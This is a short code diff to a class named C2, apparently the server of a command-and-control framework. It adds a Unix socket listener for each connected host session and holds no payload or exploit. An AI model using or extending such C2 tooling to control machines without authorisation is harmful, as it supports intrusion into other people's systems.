@@ -1037,7 +1037,17 @@ class C2():
 
                     print(f'hostname: {hostname}')
 
-                    self.unix_sockets[hostname] = session
+                    # Create a unix socket for this connection
+                    server_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+
+                    # Bind the socket to the path
+                    server_socket.bind(SOCKET_PATH)
+
+                    # Listen for incoming connections
+                    server_socket.listen(1)
+                    print(f"Unix server listening on {SOCKET_PATH}")
+
+                    self.unix_sockets[hostname] = server_socket
  
             else:
                 util.display("\n\n[-]", color='red', style='bright', end=' ')
